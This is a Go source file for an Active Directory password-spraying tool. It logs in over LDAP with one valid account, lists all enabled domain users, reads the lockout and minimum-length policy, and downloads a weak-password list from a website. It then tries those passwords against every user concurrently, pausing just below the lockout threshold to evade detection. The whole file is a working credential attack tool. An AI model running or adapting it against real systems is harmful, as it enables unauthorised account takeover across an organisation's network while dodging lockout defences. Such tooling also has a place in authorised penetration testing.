package main

import (
	"errors"
	"flag"
	"fmt"
	"io"
	"log"
	"net"
	"net/http"
	"strconv"
	"strings"
	"sync"
	"time"

	"github.com/go-ldap/ldap/v3"
	"github.com/hirochachacha/go-smb2"
)

const DEBUG = false
const WEAKPASSWORDS = "https://weakpasswords.net/"

func main() {
	validUser := flag.String("validUser", "", "Provide a valid user for downloading password policy and enabled users")
	validPassword := flag.String("validPassword", "", "Provide a valid password for downloading password policy and enabled users")
	domain := flag.String("d", "", "Domain Name")
	domainController := flag.String("dc", "", "Domain Controller Hostname or IP")
	// wordlist := flag.String("wordlist", "", "Wordlist of passwords to attempt")
	// usernames := flag.String("usernames", "", "List of Users to spray against")
	// minLength := flag.Int("minPasswordLength", 0, "Minimum password length for skipping passwords")
	// lockout := flag.Int("lockoutAttempts", 0, "Attempts before account is locked out")
	// lockoutObsMins := flag.Int("obsMin", 0, "Minutes observed for lockouts")
	victim := flag.String("victim", "", "Single user to spray against")
	flag.Parse()

	err := attemptLDAPLogin(*validUser, *validPassword, *domain, *domainController)
	if err != nil {
		fmt.Printf("Error: %s\n", err.Error())
	} else {
		fmt.Printf("LDAP Login Success\n")
	}

	users, err := ldapGetUsers(*domainController, *validUser, *validPassword, *domain)
	if err != nil {
		fmt.Printf("Error: %s\n", err)
	}
	fmt.Printf("Users count: %d\n", len(users))
	policy, err := ldapGetPasswordPolicy(*domainController, *validUser, *validPassword, *domain)
	if err != nil {
		fmt.Printf("Error: %s\n", err)
	}

	fmt.Printf("%#+v\n", policy)
	if policy.lockoutThreshold == 0 {
		fmt.Printf("No lockout policy, not rate limiting\n")
	}
	passwords := getWeakPasswords()
	fmt.Printf("Password count: %d\n", len(passwords))
	if *victim != "" {
		var wg sync.WaitGroup
		wg.Add(1)
		pass, err := targetedSpray(passwords, *victim, *domain, *domainController, policy, &wg)
		if err != nil {
			fmt.Printf("Error spraying %s: %s", *victim, pass)
		}
	} else {
		spray(users, passwords, *domain, *domainController, policy, 50)
	}
}

func spray(users, passwords []string, domain, server string, policy PasswordPolicy, threads int) {
	fmt.Printf("Spraying %d users concurrently\n", len(users))
	maxGoroutines := threads
	guard := make(chan struct{}, maxGoroutines)
	var wg sync.WaitGroup
	wg.Add(len(users))
	for _, user := range users {
		guard <- struct{}{} // would block if guard channel is already filled
		go func(user string, passwords []string, domain, server string, policy PasswordPolicy, wg *sync.WaitGroup) {
			fmt.Printf("Spraying %s\n", user)
			targetedSpray(passwords, user, domain, server, policy, wg)
			<-guard
		}(user, passwords, domain, server, policy, &wg)

		// fmt.Printf("Spraying %s\n", user)
		// go targetedSpray(passwords, user, domain, server, policy, &wg)
	}
	wg.Wait()
}

func targetedSpray(passwords []string, user, domain, server string, policy PasswordPolicy, wg *sync.WaitGroup) (string, error) {
	defer wg.Done()
	var attempts int
	if DEBUG {
		fmt.Printf("[DEBUG] Password Policy: %#+v\n", policy)
	}
	for i, password := range passwords {
		if len(password) < policy.minPwdLength {
			if DEBUG {
				fmt.Printf("[DEBUG] Skipping %s due to minPwdLength %d\n", password, policy.minPwdLength)
			}
			continue
		}
		if DEBUG {
			fmt.Printf("[DEBUG] Attempting Username: %s Password: %s [%d/%d passwords]\n", user, password, i+1, len(passwords)+1)
		}
		err := attemptLDAPLogin(user, password, domain, server)
		if err == nil {
			fmt.Printf("[SUCCESS] Username: %s Password: %s\n", user, password)
			return password, nil
		}
		attempts++
		if policy.lockoutThreshold == 0 { // No Lockout
			continue
		}
		if attempts >= policy.lockoutThreshold-1 {
			fmt.Printf("[%s] Sleeping for %f minutes to avoid locking out %s [%d/%d passwords]\n", time.Now().Format(time.RFC3339), policy.lockOutObservationWindow.Minutes(), user, i+1, len(passwords)+1)
			time.Sleep(policy.lockOutObservationWindow)
			attempts = 0
		}
	}
	return "", errors.New("password was not found")
}

func getWeakPasswords() []string {
	if DEBUG {
		fmt.Printf("Attempting to download %s\n", WEAKPASSWORDS)
	}
	var client http.Client
	resp, err := client.Get(WEAKPASSWORDS)
	if err != nil {
		log.Fatal(err)
	}
	defer resp.Body.Close()

	if resp.StatusCode == http.StatusOK {
		if DEBUG {
			fmt.Printf("Connected to %s successfully\n", WEAKPASSWORDS)
		}
		bodyBytes, err := io.ReadAll(resp.Body)
		if err != nil {
			log.Fatal(err)
		}
		bodyString := string(bodyBytes)
		// fmt.Println(bodyString)
		passwords := strings.Split(bodyString, "\n")
		passwords = passwords[:len(passwords)-4]
		return passwords
	}
	return nil
}

func ldapGetPasswordPolicy(dc, username, password, domain string) (PasswordPolicy, error) {
	var policy PasswordPolicy
	l, err := ldap.DialURL(fmt.Sprintf("ldap://%s:389", dc))
	if err != nil {
		return policy, err
	}
	defer l.Close()
	splitDomain := strings.Split(domain, ".")
	connectionString := fmt.Sprintf("%s@%s", username, domain)
	err = l.Bind(connectionString, password)
	if err != nil {
		return policy, err
	}
	searchRequest := ldap.NewSearchRequest(
		fmt.Sprintf("dc=%s,dc=%s", strings.ToUpper(splitDomain[0]), strings.ToUpper(splitDomain[1])),
		// "dc=example,dc=com", // The base dn to search
		ldap.ScopeWholeSubtree, ldap.NeverDerefAliases, 0, 0, false,
		"(objectClass=domainDNS)", // The filter to apply
		[]string{
			"minPwdLength",
			"minPwdAge",
			"maxPwdAge",
			"pwdHistoryLength",
			"lockoutThreshold",
			"lockoutDuration",
			"lockOutObservationWindow",
			"pwdProperties",
			"whenChanged",
			"gPLink"}, // A list attributes to retrieve
		nil,
	)

	sr, err := l.Search(searchRequest)
	if err != nil {
		log.Fatal(err)
	}

	for _, entry := range sr.Entries {
		loDuration := time.Duration(float64(convertLockout(entry.GetAttributeValue("lockoutDuration"))) * float64(time.Minute))
		loObs := time.Duration(float64(convertLockout(entry.GetAttributeValue("lockOutObservationWindow"))) * float64(time.Minute))
		policy.lockOutObservationWindow = loObs
		policy.lockoutDuration = loDuration
		policy.lockoutThreshold, err = strconv.Atoi(entry.GetAttributeValue("lockoutThreshold"))
		if err != nil {
			return policy, err
		}
		policy.minPwdLength, err = strconv.Atoi(entry.GetAttributeValue("minPwdLength"))
		if err != nil {
			return policy, err
		}
	}
	return policy, nil
}

// Converts ldap lockout
func convertLockout(lockout string) int {

	i, _ := strconv.Atoi(strings.Replace(lockout, "-", "", -1))
	age := i / (60 * 10000000)

	return age
}

type PasswordPolicy struct {
	minPwdLength             int
	lockoutThreshold         int           // if 0 then no lockout, run wild
	lockoutDuration          time.Duration // Windows uses microseconds
	lockOutObservationWindow time.Duration // Windows uses microseconds
}

func ldapGetUsers(dc, username, password, domain string) ([]string, error) {
	l, err := ldap.DialURL(fmt.Sprintf("ldap://%s:389", dc))
	if err != nil {
		return nil, err
	}
	defer l.Close()
	splitDomain := strings.Split(domain, ".")
	connectionString := fmt.Sprintf("%s@%s", username, domain)
	err = l.Bind(connectionString, password)
	if err != nil {
		return nil, err
	}
	searchRequest := ldap.NewSearchRequest(
		fmt.Sprintf("dc=%s,dc=%s", splitDomain[0], splitDomain[1]),
		// "dc=example,dc=com", // The base dn to search
		ldap.ScopeWholeSubtree, ldap.NeverDerefAliases, 0, 0, false,
		"(&(objectClass=user)(objectCategory=Person))",                    // The filter to apply -- Only pull users
		[]string{"sAMAccountName", "userAccountControl", "pwdProperties"}, // A list attributes to retrieve
		nil,
	)

	sr, err := l.Search(searchRequest)
	if err != nil {
		log.Fatal(err)
	}
	var users []string

	for _, entry := range sr.Entries {
		if strings.EqualFold(entry.GetAttributeValue("sAMAccountName"), username) { // we already know this password
			continue
		}
		const DISABLED_ACCOUNT = 2
		const LOCKEDOUT_ACCOUNT = 16
		uac, _ := strconv.Atoi(entry.GetAttributeValue("userAccountControl"))
		disabled := (uac & DISABLED_ACCOUNT)
		var isDisabled bool
		if disabled == DISABLED_ACCOUNT {
			isDisabled = true
		}
		var isLockedOut bool
		locked := (uac & LOCKEDOUT_ACCOUNT)
		if locked == LOCKEDOUT_ACCOUNT {
			isLockedOut = true
		}
		if DEBUG {
			fmt.Printf("[DEBUG] User: %s Disabled: %t LockedOut: %t\n", entry.GetAttributeValue("sAMAccountName"), isDisabled, isLockedOut)
		}

		if isLockedOut || isDisabled {
			continue
		}
		users = append(users, entry.GetAttributeValue("sAMAccountName"))
	}
	return users, nil
}

func attemptLDAPLogin(username, password, domain, server string) error {
	l, err := ldap.DialURL(fmt.Sprintf("ldap://%s:389", server))
	if err != nil {
		return err
	}
	defer l.Close()
	connectionString := fmt.Sprintf("%s@%s", username, domain)
	err = l.Bind(connectionString, password)
	if err != nil {
		return err
	}
	return nil
}

func attemptSMBLogin(username, password, domain, server string) error {
	conn, err := net.Dial("tcp", fmt.Sprintf("%s:%d", server, 445))
	if err != nil {
		panic(err)
	}
	defer conn.Close()

	d := &smb2.Dialer{
		Initiator: &smb2.NTLMInitiator{
			User:     username,
			Password: password,
			Domain:   domain,
		},
	}

	s, err := d.Dial(conn)
	if err != nil {
		return err
	}
	defer s.Logoff()
	return nil
}
